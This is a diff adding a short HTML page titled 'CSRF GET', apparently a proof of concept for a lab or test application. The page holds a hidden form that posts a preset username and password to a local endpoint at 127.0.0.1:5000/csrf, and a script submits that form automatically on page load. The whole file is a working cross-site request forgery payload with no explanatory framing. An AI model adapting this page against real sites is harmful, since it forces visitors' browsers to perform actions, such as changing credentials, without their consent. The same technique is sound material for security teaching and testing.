@@ -1,0 +1,15 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+<title>CSRF GET</title>
+<body>
+     <form  name="form1" action="http://127.0.0.1:5000/csrf" method="post">
+          <input type='hidden' name='username' value="csrf_ee12">
+          <input type="hidden" name="password" value="qwe1231"/>
+          <input type="submit" value>
+     </form>
+     <script>
+          document.forms.form1.submit();
+     </script>
+</body>
+</html>
